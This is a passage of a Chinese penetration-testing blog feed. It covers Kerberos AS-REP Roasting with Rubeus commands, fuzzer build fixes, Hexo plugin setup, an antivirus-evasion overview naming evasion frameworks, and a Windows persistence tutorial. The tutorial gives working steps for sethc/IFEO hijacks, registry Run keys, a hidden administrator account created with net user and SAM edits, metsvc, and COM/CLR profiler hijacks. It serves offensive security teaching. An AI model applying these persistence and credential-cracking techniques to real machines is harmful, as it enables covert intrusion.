防御手法<br>确保所有服务帐户（具有服务主体名称的用户帐户）使用的长而复杂的密码必须大于25个字符，最好为30个或更多。这使得破解这些密码更加困难。具有较高AD权限的服务帐户应重点确保其具有长而复杂的密码。确保定期更改所有服务帐户密码（每年至少更改一次）。如果可能，请使用组管理的服务帐户，这些帐户具有随机的复杂密码（&gt; 100个字符），并由Active Directory自动管理。</p><p>5.4 检测<br>由于要在用户需要访问资源时始终请求服务票证（Kerberos TGS票证），因此检测要困难得多。<br>寻找带有RC4加密的TGS-REQ数据包可能是最好的方法，尽管可能会出现误报。<br>通过启用Kerberos服务票证请求监视（“审核Kerberos服务票证操作”）并搜索具有过多4769事件（Eventid 4769 “已请求Kerberos服务票证”）的用户，可以监视Active Directory中的多个Kerberos服务票证请求。</p><h3 id="6-0-AS-REP-Roasting"><a href="#6-0-AS-REP-Roasting" class="headerlink" title="6.0 AS-REP Roasting"></a>6.0 AS-REP Roasting</h3><p>AS-REP Roasting是针对不需要预身份验证的用户帐户的Kerberos攻击。</p><p>预身份验证是Kerberos身份验证的第一步，旨在防止暴力破解密码猜测攻击。</p><p>在预身份验证期间，用户将输入其密码，该密码将用于加密时间戳，然后域控制器将尝试对其进行解密，并验证是否使用了正确的密码，并且该密码不会重播先前的请求。发出TGT，供用户将来使用。</p><p>如果禁用了预身份验证（DONT_REQ_PREAUTH），则我们可以为任何用户请求身份验证数据，那么DC将返回的加密TGT，我们就可以离线暴力破解的加密TGT。</p><p>默认情况下，Active Directory中需要预身份验证。但是，可以通过每个用户帐户上的用户帐户控制设置来控制此设置。</p><p>Under normal operations in a Windows Kerberos environment, when you<br>initiate a TGT request for a given user (Kerberos AS-REQ, message type<br>10) you have to supply a timestamp encrypted with that user’s<br>key/password. This structure is PA-ENC-TIMESTAMP and is embedded in<br>PA-DATA (preauthorization data) of the AS-REQ – both of these<br>structure are described in detail on page 60 of RFC4120 and were<br>introduced in Kerberos Version 5. The KDC then decrypts the timestamp<br>to verify if the subject making the AS-REQ really is that user, and<br>then returns the AS-REP and continues with normal authentication<br>procedures.</p><p>Note: the KDC does increase the badpwdcount attribute for any<br>incorrect PA-ENC-TIMESTAMP attempts, so we can’t use this as a method<br>to online brute-force account passwords :(</p><p>The reason for Kerberos preauthentication is to prevent offline<br>password guessing. While the AS-REP ticket itself is encrypted with<br>the service key (in this case the krbtgt hash) the AS-REP “encrypted<br>part” is signed with the client key, i.e. the key of the user we send<br>an AS-REQ for. If preauthentication isn’t enabled, an attacker can<br>send an AS-REQ for any user that doesn’t have preauth required and<br>receive a bit of encrypted material back that can be cracked offline<br>to reveal the target user’s password.</p><p>在现代Windows环境中，所有用户帐户都需要Kerberos预身份验证，但默认情况下，Windows会在不进行预身份验证的情况下尝试进行AS-REQ / AS-REP交换，而后一次在第二次提交时提供加密的时间戳：</p><p>6.1 实战手法</p><ol><li>用Rubeus进行AS-REP</li></ol><p>Rubeus是用于原始Kerberos交互和滥用的C＃工具集。</p><p> Rubeus.exe asreproast</p><p><img src="/images/pasted-17.png" alt="upload successful"><br>这将自动查找所有不需要预身份验证的帐户，并提取脱机破解所需的加密TGT数据</p><p>我们也可以使用以下命令以Hashcat可以离线破解的格式提取数据对这种哈希执行快速的暴力破解密码。</p><p>Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt<br>它将AS-REP哈希信息输出到文本文件。</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><p>对特定用户进行攻击</p><p>Rubeus.exe asreproast /user:TestOU3user</p><p><img src="/images/pasted-19.png" alt="upload successful"><br>6.2 防御手法<br>识别不需要预身份验证的帐户<br>免受此类攻击的明显保护是找到并删除设置为不需要Kerberos预身份验证的用户帐户的所有实例。</p><h3 id="7-0-MS14-068伪造的PAC利用"><a href="#7-0-MS14-068伪造的PAC利用" class="headerlink" title="7.0 MS14-068伪造的PAC利用"></a>7.0 MS14-068伪造的PAC利用</h3><h3 id="8-0-钻石PAC-使用金票和MS14-068伪造PAC的混合攻击"><a href="#8-0-钻石PAC-使用金票和MS14-068伪造PAC的混合攻击" class="headerlink" title="8.0 钻石PAC 使用金票和MS14-068伪造PAC的混合攻击"></a>8.0 钻石PAC 使用金票和MS14-068伪造PAC的混合攻击</h3><h3 id="9-0-Skeleton-Key攻击"><a href="#9-0-Skeleton-Key攻击" class="headerlink" title="9.0 Skeleton Key攻击"></a>9.0 Skeleton Key攻击</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>honggfuzz_问题解惑</title>
      <link href="2021/01/20/honggfuzz-wen-ti-jie-huo-1/"/>
      <url>2021/01/20/honggfuzz-wen-ti-jie-huo-1/</url>
      
        <content type="html"><![CDATA[<h2 id="honggfuzz-安装常遇到的问题"><a href="#honggfuzz-安装常遇到的问题" class="headerlink" title="honggfuzz 安装常遇到的问题"></a>honggfuzz 安装常遇到的问题</h2><h5 id="解惑方法一"><a href="#解惑方法一" class="headerlink" title="解惑方法一"></a>解惑方法一</h5><p>问题一：</p><p>linux/bfd.c:28:10: fatal error: bfd.h: No such file or directory<br> #include &lt;bfd.h&gt;<br>          ^~~~~~~<br>compilation terminated.<br>Makefile:259: recipe for target ‘linux/bfd.o’ failed<br>make: *** [linux/bfd.o] Error 1</p><p>这是因为没有 binutils-dev</p><p>apt-get install binutils-dev</p><p>问题二：</p><p>linux/unwind.c:27:10: fatal error: libunwind-ptrace.h: No such file or directory<br> #include &lt;libunwind-ptrace.h&gt;<br>          ^~~~~~~~~~~~~~~~~~~~<br>compilation terminated.<br>Makefile:259: recipe for target ‘linux/unwind.o’ failed<br>make: *** [linux/unwind.o] Error 1</p><p>如果提示以下错误，这是因为没有 libunwind-dev</p><p>apt-get install libunwind-dev</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客各种插件安装和问题解惑</title>
      <link href="2021/01/17/hexo-bo-ke-ge-chong-cha-jian-an-zhuang-he-wen-ti-jie-huo/"/>
      <url>2021/01/17/hexo-bo-ke-ge-chong-cha-jian-an-zhuang-he-wen-ti-jie-huo/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo-问题解惑-amp-amp-各种插件安装"><a href="#hexo-问题解惑-amp-amp-各种插件安装" class="headerlink" title="hexo 问题解惑&amp;&amp;各种插件安装"></a>hexo 问题解惑&amp;&amp;各种插件安装</h2><p>summer13</p><h3 id="一，高亮"><a href="#一，高亮" class="headerlink" title="一，高亮"></a>一，高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 hexo-prism-plugin 的 Hexo 插件来做代码高亮，安装命令如下：</p><p>bash<br>npm i -S hexo-prism-plugin<br>然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p><p>highlight:<br>  enable: false</p><p>prism_plugin:<br>  mode: ‘preprocess’    # realtime/preprocess<br>  theme: ‘tomorrow’<br>  line_number: false    # default false<br>  custom_css:</p><h3 id="二，搜索"><a href="#二，搜索" class="headerlink" title="二，搜索"></a>二，搜索</h3><p>本主题中还使用到了 hexo-generator-search 的 Hexo 插件来做内容搜索，安装命令如下：</p><p>bash<br>npm install hexo-generator-search –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>search:<br>  path: search.xml<br>  field: post</p><h3 id="三，中文链接转拼音（可选的）"><a href="#三，中文链接转拼音（可选的）" class="headerlink" title="三，中文链接转拼音（可选的）"></a>三，中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 SEO，且 gitment 评论对中文链接也不支持。我们可以用 hexo-permalink-pinyin Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><p>bash<br>npm i hexo-permalink-pinyin –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>permalink_pinyin:<br>  enable: true<br>  separator: ‘-‘ # default: ‘-‘</p><h3 id="四，文章字数统计插件（可选的）"><a href="#四，文章字数统计插件（可选的）" class="headerlink" title="四，文章字数统计插件（可选的）"></a>四，文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 hexo-wordcount插件。</p><p>安装命令如下：</p><p>bash<br>npm i –save hexo-wordcount<br>然后只需在本主题下的 _config.yml 文件中，激活以下配置项即可：</p><p>yaml<br>wordCount:<br>  enable: false # 将这个值设置为 true 即可.<br>  postWordCount: true<br>  min2read: true<br>  totalCount: true</p><h3 id="五，添加-RSS-订阅支持（可选的）"><a href="#五，添加-RSS-订阅支持（可选的）" class="headerlink" title="五，添加 RSS 订阅支持（可选的）"></a>五，添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 hexo-generator-feed 的 Hexo 插件来做 RSS，安装命令如下：</p><p>bash<br>npm install hexo-generator-feed –save<br>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>yaml<br>feed:<br>  type: atom<br>  path: atom.xml<br>  limit: 20<br>  hub:<br>  content:<br>  content_limit: 140<br>  content_limit_delim: ‘ ‘<br>  order_by: -date<br>执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后在 public 文件夹中即可看到 atom.xml 文件，说明你已经安装成功了。</p><h3 id="六，hexo可视化编辑"><a href="#六，hexo可视化编辑" class="headerlink" title="六，hexo可视化编辑"></a>六，hexo可视化编辑</h3><p>先安装hexo admin</p><p>npm install –save hexo-admin</p><p>安装完成后启动服务</p><p>hexo server -d<br>然后打开localhost:4000/admin/就可以了然后打开</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 解惑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页博客加密的各种姿势</title>
      <link href="2021/01/16/wang-ye-bo-ke-jia-mi-de-ge-chong-zi-shi/"/>
      <url>2021/01/16/wang-ye-bo-ke-jia-mi-de-ge-chong-zi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="首先输入命令："><a href="#首先输入命令：" class="headerlink" title="首先输入命令："></a>首先输入命令：</h3><p>npm install hexo-encrypt –save<br>等待安装完成后，修改博客配置文件_config.yml。<br>(切记不是hexo博客框架的_config.yml文件)<br>在末尾添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt: </span><br><span class="line">  password: 123456</span><br></pre></td></tr></table></figure><p>这里的123456为默认密码，即若文章加密并且未声明独立密码即可通过默认密码解锁文章。</p><p>然后在package.json中修改插件的版本号，修改为”hexo-encrypt”: “^0.2.0”。</p><h3 id="然后在每一篇文章的开头加入："><a href="#然后在每一篇文章的开头加入：" class="headerlink" title="然后在每一篇文章的开头加入："></a>然后在每一篇文章的开头加入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt: true</span><br><span class="line">  enc_pwd: 123456</span><br></pre></td></tr></table></figure><p>这里的enc_pwd为独立密码，设定独立密码后文章不再使用默认密码解锁，改用独立密码解锁。</p><h3 id="输入hexo-s即可查看效果。"><a href="#输入hexo-s即可查看效果。" class="headerlink" title="输入hexo s即可查看效果。"></a>输入hexo s即可查看效果。</h3><p>注意若修改完插件或密码需要先hexo clean清空缓存。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p> hexo-theme-matery<br> 加密更加简单<br> 找到hexo-theme-matery(不是hexo框架哦)  更目录下_config.yml文件下,找到<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">verifyPassword:</span><br><span class="line"> enable: true</span><br><span class="line"> promptMessage: 这是高级进阶博客，只属于定制（欢迎破解，加入13summer-Team），请输入访问本文章的密码</span><br><span class="line"> errorMessage: 密码错误，将返回主页！</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>把enable：false 改为true</p><p>然后在你的.md 文件title中加入<br>password: 123456(sha256)</p><p>password后面放的是sha256加密的hash值，不可写明文密码（防止泄漏）</p><p>sha256:<a href="http://tool.chinaz.com/tools/hash.aspx">站长之家</a></p><p>sha256:<a href="https://tool.oschina.net/encrypt?type=2">开源在线工具</a></p><p>sha256:<a href="http://encode.chahuo.com/">chahuo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13summer-2021年-视频课程计划</title>
      <link href="2021/01/13/13summer-shi-pin-ke-cheng-ji-hua/"/>
      <url>2021/01/13/13summer-shi-pin-ke-cheng-ji-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="–2021年渗透学习计划–"><a href="#–2021年渗透学习计划–" class="headerlink" title="–2021年渗透学习计划–"></a>–2021年渗透学习计划–</h2><p>本课程为2021年最新课程，属于高级进阶版，在线更新，需要的联系作者；后续作者将推出，渗透测试基础教程；</p><p>本课程之用作教学，艺术，多方为技巧专研，切勿用作非法用途！——————————————饭我中华，虽远必黑！</p><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><h5 id="一-内网渗透"><a href="#一-内网渗透" class="headerlink" title="一. 内网渗透**"></a>一. 内网渗透**</h5><ol><li>内网渗透</li><li>conbalt_strike</li><li>linux_提权</li><li>windows_提权</li><li>后门（msf,cs）</li><li>持久化</li><li>注入</li><li>木马的通信协议</li></ol><h5 id="二-hook（windows-linux-android）"><a href="#二-hook（windows-linux-android）" class="headerlink" title="二.hook（windows/linux/android） **"></a>二.hook（windows/linux/android） **</h5><ol><li>驱动层hook(windows)<br>IRP hook<br>Object hook<br>SSDT hook<br>SSSDT hook<br>VT hook</li></ol><ol start="2"><li>驱动注入(windows)<br>远程线程注入<br>APC 注入<br>IAT 注入<br>全局内存注入</li></ol><ol start="3"><li>linux下hook及注入<br>内联（inline）hook<br>GOT hook</li></ol><p>ELF 注入<br>GOT 注入<br>ftrace 注入<br>反射注入</p><ol start="4"><li><p>R0 层hook及注入(linux)<br>SYSCALL hook<br>oops hook<br>IDT hook<br>GOT 注入<br>ftrace 注入</p></li><li><p>android<br>内联 hook<br>内联 hook(armv8)<br>GOT hook<br>JNI 技术<br>Native java hook<br>ART/Dalvik hook<br>Xposed 框架使用<br>frida</p></li></ol><h5 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权**"></a>三.提权**</h5><ol><li><p>linux:<br>linux 内核漏洞提权<br>linux SUID 提权<br>GNU C library动态链接区 $ORIGIN溢出提权<br>linux mysql udf提权<br>LINUX CRON JOBS提权<br>metasploit linux提权<br>ssh私钥解密+ 系统提权（溢出提权）</p></li><li><p>windows:<br>WINDOWS 系统溢出提权<br>WINDOWS ASPX溢出提权<br>MYSQL UDF 提权<br>SQLSERVER 提权<br>WINDOWS SERVER2008 R2 溢出提权<br>LPK 劫持提权<br>MOF 提权<br>ZEND 反弹SHELL提权<br>FileZilla 提权<br>metasploit windows 提权<br>msf 结合漏洞审计工具提权</p></li></ol><h5 id="四-免杀-自启动"><a href="#四-免杀-自启动" class="headerlink" title="四.免杀-自启动 **"></a>四.免杀-自启动 **</h5><p>windows:<br>msf 免杀<br>cobalt strike 免杀<br>4种常用的免杀框架</p><p>linux:</p><p>android:</p><hr><p>难点详解扩展</p>]]></content>
      
      
      
        <tags>
            
            <tag> 视频 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权-组合拳</title>
      <link href="2021/01/13/windows-ti-quan-zu-he-quan/"/>
      <url>2021/01/13/windows-ti-quan-zu-he-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="windows-提权总结"><a href="#windows-提权总结" class="headerlink" title="windows 提权总结"></a>windows 提权总结</h2><h5 id="ms11-080提权"><a href="#ms11-080提权" class="headerlink" title="ms11-080提权"></a>ms11-080提权</h5><p>提权环境xp系统（英文版）<br>如果是中文版（就变成成了DDOS 会出现蓝屏）</p><h5 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linxu提权-组合拳</title>
      <link href="2021/01/13/linxu-ti-quan-zu-he-quan/"/>
      <url>2021/01/13/linxu-ti-quan-zu-he-quan/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt_Strike</title>
      <link href="2021/01/13/cobalt-strike/"/>
      <url>2021/01/13/cobalt-strike/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><h4 id="AV查杀的四种方式"><a href="#AV查杀的四种方式" class="headerlink" title="AV查杀的四种方式"></a>AV查杀的四种方式</h4><p>文件,内存，流量，行为。</p><p>免杀方式</p><pre><code>加壳多平台多语言生成shellcode加密shellcode 加载插入正常文件白名单加载</code></pre><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>这几款是比较热门的,但是感觉效果一般了。</p><pre><code>面纱 https://github.com/Veil-Framework/Veil幻影逃避 https://github.com/oddcod3/Phantom-Evasion剥壳机 https://www.shellterproject.com/download/Avet https://github.com/govolution/avet</code></pre><p>总的来说支持msf的免杀框架都能用来免杀CS，因为他们的通讯是相通的，免杀msf用CS上线也是一样。 </p>]]></content>
      
      
      <categories>
          
          <category> Cobaltstrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 远控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows后门持久化</title>
      <link href="2021/01/07/windows-hou-men-chi-jiu-hua/"/>
      <url>2021/01/07/windows-hou-men-chi-jiu-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="windows-后门持久化"><a href="#windows-后门持久化" class="headerlink" title="windows 后门持久化"></a>windows 后门持久化</h2><p>shift后门<br>映像劫持<br>注册表自启动项<br>定时任务<br>用户登陆初始化<br>Logon Scripts<br>屏幕保护程序<br>自启动服务<br>影子用户<br>waitfor<br>CLR<br>Hijack CAccPropServicesClass and MMDeviceEnumerator<br>劫持MruPidlList<br>office系列<br>Word WLL<br>Excel XLL<br>PowerPoint VBA add-ins<br>文件关联<br>AppInit_DLLs<br>Netsh helper<br>利用BITS<br>利用inf文件实现后门</p><p><img src="hacker1.jpeg"></p><h3 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h3><p>这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</p><p>C:\Windows\System32\sethc.exe 粘滞键，启动快捷键：按五次shift键<br>C:\Windows\System32\utilman.exe 设置中心，启动快捷键：Windows+U键<br>在低版本的windows中，我们可以直接把setch.exe替换成我们的后门程序，下面我们把setch.exe替换为cmd.exe</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p><p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p><p>就是Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。<br>PS：来自百度百科<br>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p><p>操作也很简单，在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option下添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径，如下图</p><h3 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h3><p>MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下</p><p>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</p><p>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p><p>常见注册表启动项键的位置：</p><p>用户级</p><p>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>系统级</p><p>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br>定时任务<br>windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行，下面我们逐个看看</p><p>at的一些参数</p><p>AT [\computername] time [/INTERACTIVE]<br>[ /EVERY:date[,…] | /NEXT:date[,…]] “command”</p><p>schtasks一些参数：</p><p>schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month…] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain]user /p password]] [/ru {[Domain]User | “System”} [/rp Password]] /?<br>schtasks的执行如下：</p><h3 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h3><p>Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序</p><p>注册表路径为：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit，我们添加一个我们启动的程序，多个程序用逗号隔开</p><h3 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h3><p>Logon Scripts优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：HKEY_CURRENT_USER\Environment，创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：HKEY_CURRENT_USER\Control Panel\Desktop，关键键值如下：</p><p>SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</p><p>ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</p><p>ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</p><h3 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h3><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p><p>为了方便起见我们可以直接用Metasploit来注册一个服务</p><p>meterpreter &gt; run metsvc -A</p><p>运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe</p><p>同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”，默认绑定在31337端口。</p><p>如果想删除服务，可以执行</p><p>meterpreter &gt; run metsvc -r</p><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p>在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p><p>net user test$ test /add<br>net localgroup administrators test$ /add<br>可以看到net user是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><p>所以这时候我们就需要修改一下注册表，其键位置为：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</p><p>注意：SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限</p><p>然后我们将administrator用户对应的项中的F值复制到test$对应xiang中的F值，然后保存</p><p>然后我们将test$删除掉</p><p>net user test$ /del<br>然后再双击导出的注册表文件，然后我们再看一下</p><p>net user和计算机管理-用户和组中都查看不到用户了，但是我们可以用net user test$查看用户信息</p><p>这个时候我们再用net user test$ /del是删除不掉这个用户的，只能通过注册表来删除。</p><h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>关于waitfor手册中是这么解释的：</p><p>在系统上发送或等待信号。waitfor可用于跨网络同步计算机。<br>waitfor的语法</p><p>waitfor [/s [/u [] [/p []]]] /si<br>waitfor [/t ]<br>参数解释：</p><p>/s <Computer>  指定远程计算机的名称或IP地址，默认为本地计算机<br>/u [<Domain>]<user>    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。<br>/p <Password>  指定/u参数中指定的用户帐户的密码。<br>/si            发送指定激活信号。<br>/t             指定等待信号的秒数。默认为无限期等待。<br><SignalName>    指定等待或发送的信号，不区分大小写，长度不能超过225个字符<br>我们来测试一下看看</p><p>waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器<br>waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test<br>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p>这里就要借用一下三好师傅的powershell脚本：<a href="https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1">https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1</a></p><p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR的简述（来自百度百科）</p><p>CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引擎。<br>需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p>修改一下注册表，注册表路径：</p><p>HKEY_CURRENT_USER\Software\Classes\CLSID\，新建子项{11111111-1111-1111-1111-111111111111}（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径<br>然后在cmd下设置一下：<br>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</p><p>SETX COR_ENABLE_PROFILING=1 /M<br>SETX COR_PROFILER={11111111-1111-1111-1111-111111111111} /M<br>然后执行一波，效果如下，可以看到已经成功劫持了</p><h3 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h3><p>什么是COM（来自WIKI）</p><p>组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。<br>这个和CRL劫持.NET程序类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p>在%APPDATA%\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test._dl</p><p>PS：如果Installer文件夹不存在，则依次创建Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}</p><p>然后就是修改注册表了，在注册表位置为：HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\Users\qiyou\AppData\Roaming\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment</p><p>然后就是测试了，打开iexplore.exe，成功弹框</p><p>PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator</p><h3 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" 